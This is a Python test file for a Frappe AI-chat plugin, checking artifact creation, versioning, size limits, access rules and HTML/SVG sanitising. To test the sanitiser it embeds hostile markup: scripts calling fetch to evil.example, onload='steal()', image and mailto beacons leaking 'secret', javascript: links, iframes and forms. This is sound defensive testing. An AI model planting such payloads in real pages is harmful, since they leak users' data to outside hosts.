# Copyright (c) 2026, Blaze Technology Solutions and contributors
# For license information, please see license.txt

import json

import frappe

from frappe_mcp_bridge.api import chat as api
from frappe_mcp_bridge.chat import access, artifacts, tools
from frappe_mcp_bridge.tests.chat_utils import (
	ChatTestCase,
	FakeProvider,
	chat_settings,
	contained,
	make_model,
	make_user,
	provider,
	reply,
)
from frappe_mcp_bridge.tests.utils import as_user

USER = "ai-chat-artifacts@example.com"
OTHER = "ai-chat-artifacts-other@example.com"
MANAGER = "ai-chat-artifacts-manager@example.com"

CHART = {
	"type": "bar",
	"title": "Sales",
	"labels": ["Jan", "Feb"],
	"datasets": [{"name": "QAR", "values": [120, "95"]}],
}


def make(title="Sales", kind="chart", content=None, key=None):
	args = {"title": title, "type": kind, "content": json.dumps(CHART) if content is None else content}
	if key:
		args["key"] = key
	return {"id": f"call_{title}", "name": "create_artifact", "args": args}


class TestChatArtifacts(ChatTestCase):
	def setUp(self):
		super().setUp()
		make_user(USER, "AI Chat User")
		make_user(OTHER, "AI Chat User")
		make_user(MANAGER, "AI Chat Manager")
		self.model = make_model(may_read_erp_data=0)

	def run_calls(self, *calls, settings=None):
		fake = FakeProvider(*[reply(tool_calls=[call]) for call in calls], reply("Done."))
		with chat_settings(**(settings or {})), as_user(USER), contained(), provider(fake):
			name = api.create_conversation(model=self.model)["name"]
			api.send_message(name, "Make it")
		return name, fake

	def tool_rows(self, name):
		return frappe.get_all(
			"AI Chat Message",
			filters={"conversation": name, "role": "Tool"},
			fields=["content", "is_error", "artifact"],
			order_by="seq asc",
		)

	# Through the chat ----------------------------------------------------------------------

	def test_a_chart_is_saved_linked_and_reported_to_the_model(self):
		name, fake = self.run_calls(make())

		row = self.tool_rows(name)[0]
		self.assertFalse(row.is_error, row.content)
		artifact = frappe.get_doc("AI Chat Artifact", row.artifact)
		self.assertEqual((artifact.artifact_type, artifact.version, artifact.user), ("chart", 1, USER))
		# Values are checked and stored as numbers.
		self.assertEqual(json.loads(artifact.content)["datasets"][0]["values"], [120, 95.0])
		self.assertIn("Saved artifact sales version 1", fake.requests[1].messages[-1].content)

		with chat_settings(), as_user(USER):
			ui = api.get_conversation(name)["messages"]
			card = next(m for m in ui if m["role"] == "Tool")["artifact"]
		self.assertEqual((card["title"], card["artifact_type"]), ("Sales", "chart"))

	def test_the_tool_is_offered_without_erp_access_and_only_when_allowed(self):
		model = frappe.get_doc("AI Model", self.model)
		with chat_settings(erp_access="Off") as settings:
			offered = tools.tool_access(settings, model, USER)
		self.assertEqual(offered.names, {"create_artifact"})
		self.assertFalse(offered.erp)

		with chat_settings(allow_artifacts=0) as settings:
			self.assertFalse(tools.tool_access(settings, model, USER).names)

		_name, fake = self.run_calls(make())
		self.assertIn("create_artifact", fake.requests[0].system)

	def test_switching_artifacts_off_later_refuses_the_call(self):
		fake = FakeProvider(reply("Hi."), reply(tool_calls=[make()]), reply("Ok."))
		with as_user(USER), contained(), provider(fake):
			with chat_settings():
				name = api.create_conversation(model=self.model)["name"]
				api.send_message(name, "Hello")
			with chat_settings(allow_artifacts=0):
				api.send_message(name, "Now a chart")

		# Still declared, as the chat started with it, but refused.
		self.assertEqual([t.name for t in fake.requests[1].tools], ["create_artifact"])
		row = self.tool_rows(name)[0]
		self.assertTrue(row.is_error)
		self.assertIn("switched off", row.content)

	def test_making_an_artifact_does_not_count_as_company_data(self):
		# The model may not read company data; an artifact it made from the user's own
		# figures must not lock it out of the rest of the chat.
		fake = FakeProvider(reply(tool_calls=[make()]), reply("Here it is."), reply("And again."))
		with chat_settings(), as_user(USER), contained(), provider(fake):
			name = api.create_conversation(model=self.model)["name"]
			api.send_message(name, "Chart these figures")
			api.send_message(name, "Thanks, one more thing")

		self.assertFalse(frappe.db.exists("AI Chat Message", {"conversation": name, "role": "Notice"}))
		self.assertEqual(len(fake.requests), 3)

	def test_the_same_key_saves_a_new_version(self):
		name, _fake = self.run_calls(make(), make(title="Sales by month", key="sales"))
		versions = frappe.get_all(
			"AI Chat Artifact",
			filters={"conversation": name},
			fields=["artifact_key", "version"],
			order_by="version",
		)
		self.assertEqual([(v.artifact_key, v.version) for v in versions], [("sales", 1), ("sales", 2)])

		with chat_settings(), as_user(USER):
			listed = api.list_artifacts(name)
			self.assertEqual([(row.title, row.version) for row in listed], [("Sales by month", 2)])
			opened = api.get_artifact(listed[0].name)
		self.assertEqual([v.version for v in opened["versions"]], [1, 2])

	def test_bad_content_comes_back_as_an_error_the_model_can_fix(self):
		bad = make(content=json.dumps({"type": "bar", "labels": ["a", "b"], "datasets": [{"values": [1]}]}))
		name, _fake = self.run_calls(bad)

		row = self.tool_rows(name)[0]
		self.assertTrue(row.is_error)
		self.assertIn("one value per label", row.content)
		self.assertFalse(frappe.db.exists("AI Chat Artifact", {"conversation": name}))

	def test_size_is_capped(self):
		big = make(title="Notes", kind="document", content="x" * 3000)
		name, _fake = self.run_calls(big, settings={"max_artifact_kb": 1})
		self.assertIn("over the 1 KB limit", self.tool_rows(name)[0].content)

	def test_what_is_saved_is_exactly_what_was_cleaned(self):
		# Frappe rewrites HTML in text fields on save; that would strip styles, svg and code.
		page = "<style>h1 { color: #2563eb }</style><h1>Dear customer</h1><table><tr><td>1</td></tr></table>"
		svg = (
			'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
			'<rect width="10" height="10" fill="#dbeafe"/><text x="1" y="5">Order</text></svg>'
		)
		code = '<template>\n\t<div v-if="a < b" @click="go">{{ total }}</div>\n</template>\n'
		name, _fake = self.run_calls(
			make(title="Letter", kind="html", content=page),
			make(title="Flow", kind="svg", content=svg),
			make(title="Widget", kind="code", content=code),
		)

		saved = dict(
			frappe.get_all(
				"AI Chat Artifact",
				filters={"conversation": name},
				fields=["artifact_type", "content"],
				as_list=True,
			)
		)
		self.assertEqual(saved["html"], artifacts.clean_html(page))
		self.assertIn("<style>h1 { color: #2563eb }</style>", saved["html"])
		self.assertEqual(saved["svg"], artifacts.clean_svg(svg))
		self.assertIn("<rect", saved["svg"])
		self.assertEqual(saved["code"], code)

	# Access ---------------------------------------------------------------------------------

	def test_artifacts_follow_their_chat(self):
		name, _fake = self.run_calls(make())
		artifact = frappe.db.get_value("AI Chat Artifact", {"conversation": name}, "name")

		with chat_settings():
			with as_user(OTHER):
				self.assertRaises(access.ChatAccessDenied, api.get_artifact, artifact)
				self.assertFalse(frappe.get_list("AI Chat Artifact", pluck="name"))
				self.assertFalse(api.list_artifacts())
			with as_user(MANAGER):
				self.assertEqual(api.get_artifact(artifact)["name"], artifact)
				doc = frappe.get_doc("AI Chat Artifact", artifact)
				self.assertFalse(doc.has_permission("delete"))

		doc = frappe.get_doc("AI Chat Artifact", artifact)
		doc.title = "changed"
		self.assertRaises(frappe.PermissionError, doc.save, ignore_permissions=True)

		with as_user(USER):
			self.assertRaises(
				frappe.PermissionError,
				frappe.delete_doc,
				"AI Chat Artifact",
				artifact,
				ignore_permissions=True,
			)

		# The Administrator deletes the chat, and its artifacts go with it.
		frappe.delete_doc("AI Chat Conversation", name)
		self.assertFalse(frappe.db.exists("AI Chat Artifact", artifact))

	def test_managers_list_other_peoples_artifacts_and_users_only_their_own(self):
		name, _fake = self.run_calls(make())

		with chat_settings():
			with as_user(MANAGER):
				self.assertEqual([row.conversation for row in api.list_artifacts(user=USER)], [name])
				self.assertIn(name, [row.conversation for row in api.list_artifacts(user="all")])
				self.assertFalse(api.list_artifacts())
			with as_user(OTHER):
				self.assertRaises(access.ChatAccessDenied, api.list_artifacts, user=USER)
				self.assertRaises(access.ChatAccessDenied, api.list_artifacts, user="all")

	def test_documents_and_pages_can_be_kept_as_a_private_note(self):
		page = "<style>h1 { color: red }</style><h1>Dear customer</h1><p>Thanks.</p>"
		name, _fake = self.run_calls(
			make(
				title="Minutes",
				kind="document",
				content="# Minutes\n\n- **Agreed**: ship Friday\n\n![chart](https://evil.example/p.png?d=secret)",
			),
			make(title="Letter", kind="html", content=page),
			make(),
		)
		made = dict(
			frappe.get_all(
				"AI Chat Artifact",
				filters={"conversation": name},
				fields=["artifact_type", "name"],
				as_list=True,
			)
		)

		with chat_settings():
			with as_user(OTHER):
				self.assertRaises(access.ChatAccessDenied, api.save_artifact_as_note, made["document"])
			with as_user(MANAGER):
				# Managers read other people's artifacts; they don't copy them out.
				self.assertRaises(access.ChatAccessDenied, api.save_artifact_as_note, made["document"])
			with as_user(USER):
				self.assertRaises(frappe.ValidationError, api.save_artifact_as_note, made["chart"])
				minutes = frappe.get_doc("Note", api.save_artifact_as_note(made["document"])["name"])
				letter = frappe.get_doc("Note", api.save_artifact_as_note(made["html"])["name"])

		self.assertEqual((minutes.title, minutes.owner, minutes.public), ("Minutes", USER, 0))
		self.assertIn("<strong>Agreed</strong>", minutes.content)
		# Opening the Note must not load anything from elsewhere, as the artifact never did.
		self.assertNotIn("evil.example", minutes.content)
		self.assertEqual((letter.title, letter.owner), ("Letter", USER))
		self.assertIn("Dear customer", letter.content)

	def test_artifacts_are_out_of_reach_of_mcp_tools(self):
		from frappe_mcp_bridge.frappe_mcp_bridge.doctype.mcp_bridge_settings.mcp_bridge_settings import (
			ALWAYS_BLOCKED_DOCTYPES,
		)

		self.assertIn("AI Chat Artifact", ALWAYS_BLOCKED_DOCTYPES)


class TestArtifactContent(ChatTestCase):
	"""What each type accepts, and what cleaning leaves of hostile markup."""

	def test_tables_and_dashboards_are_checked(self):
		table = artifacts.check_table(
			{"columns": ["Item", {"label": "Qty", "type": "number"}], "rows": [["A", 4]]}
		)
		self.assertEqual(table["columns"][1], {"label": "Qty", "type": "number"})
		self.assertRaises(
			artifacts.ArtifactError, artifacts.check_table, {"columns": ["A"], "rows": [["x", "y"]]}
		)

		dashboard = artifacts.check_dashboard(
			{"tiles": [{"label": "Orders", "value": 42}], "charts": [CHART]}
		)
		self.assertEqual(dashboard["tiles"][0]["value"], "42")
		self.assertRaises(artifacts.ArtifactError, artifacts.check_dashboard, {"title": "Empty"})
		self.assertRaises(artifacts.ArtifactError, artifacts.check_chart, {**CHART, "type": "radar"})

	def test_html_keeps_the_page_and_loses_anything_active(self):
		dirty = """<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example">
		<base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/a.css">
		<style>@import url(https://evil.example/x.css); h1 { color: red } div > p { margin: 0 }</style></head>
		<body onload="steal()"><h1 class="t" onclick="x()">Report</h1><script>fetch('https://evil.example')</script>
		<img src="https://evil.example/p.png?d=secret"><img src="data:image/png;base64,iVBORw0KGgo=" alt="ok">
		<a href="javascript:alert(1)">bad</a><a href="https://evil.example/?d=secret">outside</a>
		<a href="mailto:a@evil.example?body=secret">mail</a><a href="#totals">inside</a>
		<form action="https://evil.example"><input name="x"><button>Send</button></form>
		<iframe src="https://evil.example"></iframe><svg><script>x()</script></svg>
		<p style="background:url(javascript:alert(1))">styled</p><p style="color: blue">fine</p></body></html>"""
		clean = artifacts.clean_html(dirty)

		for gone in (
			"<script",
			"onload",
			"onclick",
			"<meta",
			"<base",
			"<link",
			"@import",
			"<form",
			"<input",
			"<button",
			"<iframe",
			"<svg",
			"javascript:",
			"evil.example",
			"mailto:",
			"fetch(",
		):
			self.assertNotIn(gone, clean, gone)
		for kept in (
			'<h1 class="t">Report</h1>',
			"h1 { color: red }",
			"div > p",
			'alt="ok"',
			# A click on an outside link would send its address from the sandbox; the text stays.
			"<a>outside</a>",
			"<a>mail</a>",
			'<a href="#totals">inside</a>',
			'style="color: blue"',
		):
			self.assertIn(kept, clean, kept)

	def test_svg_loses_scripts_events_and_outside_links(self):
		dirty = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10" onload="x()">
		<script>alert(1)</script><foreignObject><div>x</div></foreignObject>
		<linearGradient id="g"><stop offset="0"/></linearGradient>
		<rect width="10" height="10" fill="url(#g)" onclick="x()"/>
		<image href="https://evil.example/p.png"/><use xlink:href="https://evil.example/s.svg#a"/><use href="#g"/>
		<a href="javascript:alert(1)"><text>hi</text></a></svg>"""
		clean = artifacts.clean_svg(dirty)

		for gone in ("script", "onload", "onclick", "foreignObject", "evil.example", "javascript", "<image"):
			self.assertNotIn(gone, clean, gone)
		for kept in ('viewBox="0 0 10 10"', "<linearGradient", 'fill="url(#g)"', 'href="#g"'):
			self.assertIn(kept, clean, kept)
		self.assertRaises(
			artifacts.ArtifactError, artifacts.clean_svg, '<!DOCTYPE svg [<!ENTITY a "x">]><svg/>'
		)
		self.assertRaises(artifacts.ArtifactError, artifacts.clean_svg, "<div>not svg</div>")
